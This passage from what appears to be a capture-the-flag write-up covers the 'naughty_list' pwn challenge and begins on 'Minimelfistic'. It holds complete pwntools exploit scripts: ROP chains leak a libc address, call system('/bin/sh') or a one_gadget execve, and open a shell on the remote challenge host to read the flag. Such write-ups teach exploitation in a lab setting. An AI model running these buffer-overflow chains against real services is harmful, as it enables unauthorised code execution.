<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">MAIN_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">RET</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">rop1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>      <span class="c1"># To reach the stored return address
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>  <span class="c1"># Pop into RDI, which is used as the first argument
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span> <span class="c1"># Address storing the address of puts()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span> <span class="c1"># Execute puts()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN_PLT</span><span class="p">)</span> <span class="c1"># After running puts(), run main() again
</span>
<span class="c1"># Deal with the entering of name, surname and age 
</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"21"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="c1"># Send our ROP chain
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span>


<span class="c1"># Retrieve the address of puts() that is printed out to stdout
</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">received</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">))</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/Downloads/naughty_list'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./naughty_list'</span>: pid 7198
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded 17 cached gadgets <span class="k">for</span> <span class="s1">'./naughty_list'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> puts @ 0x7fc1258ec210 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopped process <span class="s1">'./naughty_list'</span> <span class="o">(</span>pid 7198<span class="o">)</span>
</pre></table></code></div></div><p>By returning to <code class="language-plaintext highlighter-rouge">main()</code> at the execution of the ROP chain, we can now properly jump to <code class="language-plaintext highlighter-rouge">system()</code> since we now know exactly where it is.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="c1"># ... To be appended to the above script
</span>
<span class="c1"># Update with the calculated start of libc
</span><span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># Deal with the entering of name, surname and age again
</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"21"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># Find /bin/sh, system() and exit()
</span><span class="n">BINSH</span> <span class="o">=</span>  <span class="nb">next</span><span class="p">(</span><span class="n">LIBC</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
<span class="n">EXIT</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]</span>


<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"/bin/sh @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="n">rop2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>     <span class="c1"># To reach the stored return address
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="c1"># Pop into RDI, which is used as the first argument
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span>   <span class="c1"># Address of "/bin/sh"
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>  <span class="c1"># Address of system()
</span><span class="n">rop2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXIT</span><span class="p">)</span>    <span class="c1"># Address of exit()
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>...
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./naughty_list'</span>: pid 7304
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded 17 cached gadgets <span class="k">for</span> <span class="s1">'./naughty_list'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> puts @ 0x7f0fd0f4c210 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh @ 0x7f0fd105f69b 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system @ 0x7f0fd0f1fe10 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 🎅 will take a better look and hopefuly you will get your 🎁!
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kali<span class="o">)</span>
</pre></table></code></div></div><p>Now that it works locally, we can now update it to work with the exposed remote service by pointing the libc file to the provided one and configuring the script to connect to the provided IP and port.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># Found by running `ldd naughty_list`
# libc_file = "/lib/x86_64-linux-gnu/libc.so.6"
</span><span class="n">libc_file</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>

<span class="n">elf_file</span> <span class="o">=</span> <span class="s">"./naughty_list"</span>

<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_file</span><span class="p">)</span>
<span class="n">ELF_LOADED</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_file</span><span class="p">)</span>

<span class="c1"># p = process("./naughty_list")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"138.68.183.216"</span><span class="p">,</span> <span class="mi">31886</span><span class="p">)</span>
<span class="p">...</span>
</pre></table></code></div></div><p>Unfortunately, after executing it, no shell was spawned. :( After some tries, I figured that perhaps <code class="language-plaintext highlighter-rouge">system()</code> was being limited or blocked on the machine so I try using <code class="language-plaintext highlighter-rouge">execve()</code> instead. Using <code class="language-plaintext highlighter-rouge">execve()</code> is much more troublesome as it has more than 1 parameter, therefore involving more gadgets to set it up.</p><p>I then came across a tool called <a href="https://github.com/david942j/one_gadget"><code class="language-plaintext highlighter-rouge">OneGadget</code></a>, which was able to inform me the instructions that can lead to a <code class="language-plaintext highlighter-rouge">execve()</code> call that spawns <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>one_gadget ./libc.so.6 
0x4f3d5 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x40, environ<span class="o">)</span>
constraints:
  rsp &amp; 0xf <span class="o">==</span> 0
  rcx <span class="o">==</span> NULL

0x4f432 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x40, environ<span class="o">)</span>
constraints:
  <span class="o">[</span>rsp+0x40] <span class="o">==</span> NULL

0x10a41c execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x70, environ<span class="o">)</span>
constraints:
  <span class="o">[</span>rsp+0x70] <span class="o">==</span> NULL
</pre></table></code></div></div><p>To use then, we will need to comply with the constraints listed below them. Fortunately, achieving <code class="language-plaintext highlighter-rouge">[rsp+0x40] == NULL</code> is actually quite simple as we could just append a bunch of <code class="language-plaintext highlighter-rouge">0x00</code> bytes to the end of our payload.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1"># ... Commenting out the previous ropchain
# rop2 = b"A" * 40     # To reach the stored return address
# rop2 += p64(POP_RDI) # Pop into RDI, which is used as the first argument
# rop2 += p64(BINSH)   # Address of "/bin/sh"
# rop2 += p64(SYSTEM)  # Address of system()
# rop2 += p64(EXIT)    # Address of exit()
# p.sendline(rop2)
</span>
<span class="c1"># Find the gadget
</span><span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>

<span class="n">rop3</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>         <span class="c1"># To reach the stored return address
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>  <span class="c1"># Address of the gadget
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">100</span>    <span class="c1"># Ensure that [rsp+0x40] is NULL
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>After updating the script, we execute it again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">[</span>+] Opening connection to 68.183.40.128 on port 30414: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded 17 cached gadgets <span class="k">for</span> <span class="s1">'./naughty_list'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> puts @ 0x7f961cc33aa0 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh 0x7f961cd66e1a 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system 0x7f961cc02550 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 🎅 will take a better look and hopefuly you will get your 🎁!
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>999<span class="o">(</span>ctf<span class="o">)</span>
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt  libc.so.6  naughty_list
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
HTB<span class="o">{</span>u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft<span class="o">}</span>
</pre></table></code></div></div><p>Finally! We managed to establish a shell and we managed to read the flag.</p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}</code></p><p>Full script:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># Found by running `ldd naughty_list`
# libc_file = "/lib/x86_64-linux-gnu/libc.so.6"
</span><span class="n">libc_file</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>

<span class="n">elf_file</span> <span class="o">=</span> <span class="s">"./naughty_list"</span>

<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_file</span><span class="p">)</span>
<span class="n">ELF_LOADED</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_file</span><span class="p">)</span>

<span class="c1"># p = process("./naughty_list")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"68.183.40.128"</span><span class="p">,</span> <span class="mi">30414</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">ELF_LOADED</span><span class="p">)</span>

<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>

<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">MAIN_PLT</span> <span class="o">=</span> <span class="n">ELF_LOADED</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">RET</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">rop1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>        <span class="c1"># To reach the stored return address
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>    <span class="c1"># Pop into RDI, which is used as the first argument
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span>   <span class="c1"># Address of puts()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span>   <span class="c1"># Execute puts()
</span><span class="n">rop1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN_PLT</span><span class="p">)</span>   <span class="c1"># After running puts(), run main() again
</span>
<span class="c1"># Deal with the entering of name, surname and age 
</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"21"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="c1"># Send our ROP chain
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop1</span><span class="p">)</span>

<span class="c1"># Retrieve the address of puts() that is printed out to stdout
</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">received</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">))</span>

<span class="c1"># Update with the calculated start of libc
</span><span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># Deal with the entering of name, surname and age again
</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"id"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"21"</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># Find /bin/sh, system() and exit()
</span><span class="n">BINSH</span> <span class="o">=</span>  <span class="nb">next</span><span class="p">(</span><span class="n">LIBC</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
<span class="n">EXIT</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"/bin/sh @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system @ %s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>

<span class="c1"># rop2 = b"A" * 40     # To reach the stored return address
# rop2 += p64(POP_RDI) # Pop into RDI, which is used as the first argument
# rop2 += p64(BINSH)   # Address of "/bin/sh"
# rop2 += p64(SYSTEM)  # Address of system()
# rop2 += p64(EXIT)    # Address of exit()
# p.sendline(rop2)
</span>
<span class="c1"># Find the gadget
</span><span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>

<span class="n">rop3</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>         <span class="c1"># To reach the stored return address
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>  <span class="c1"># Address of the gadget
</span><span class="n">rop3</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">100</span>    <span class="c1"># Ensure that [rsp+0x40] is NULL
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop3</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="minimelfistic-day-4">Minimelfistic (Day 4)</h2><blockquote><p>The Elves finally understood what went wrong with all their plans. They were too fancy and obvious! But, this one is different.. It’s a security system, but the alarm rings whenever Santa’s house is vulnerable to an attack. Will you manage to deactivate it? p.s. Sound on!<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">pwn_minimelfistic.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">pwn_minimelfistic.zip</code> was a binary <code class="language-plaintext highlighter-rouge">minimelfistic</code> and <code class="language-plaintext highlighter-rouge">libc.so.6</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./minimelfistic 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Santa is not home!

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Santa is not home!

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Santa is not home!

<span class="o">[!]</span> Santa returned!

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hello 🎅! Do you want to turn off the 🚨? <span class="o">(</span>y/n<span class="o">)</span>
<span class="o">&gt;</span> 9
Goodbye Santa!

<span class="o">[!]</span> For your safety, the 🚨 will not be deactivated!
</pre></table></code></div></div><p>When the program ask <code class="language-plaintext highlighter-rouge">Do you want to turn off the 🚨?</code>, entering <code class="language-plaintext highlighter-rouge">y</code> or <code class="language-plaintext highlighter-rouge">n</code> did not matter. However, according to <code class="language-plaintext highlighter-rouge">Ghidra</code>, entering <code class="language-plaintext highlighter-rouge">9</code> would cause the program to terminate properly. Anyways, lets open it using <code class="language-plaintext highlighter-rouge">Ghidra</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">sVar1</span><span class="p">;</span>
    <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
    <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
    <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
    <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
    <span class="n">undefined</span> <span class="o">*</span><span class="n">local_28</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">local_20</span><span class="p">;</span>
    <span class="n">undefined</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
    
    <span class="n">setup</span><span class="p">();</span>
    <span class="n">local_c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sec_alarm</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="n">local_18</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_004022d0</span><span class="p">;</span>
        <span class="n">sVar1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_004022d0</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">sVar1</span><span class="p">);</span>
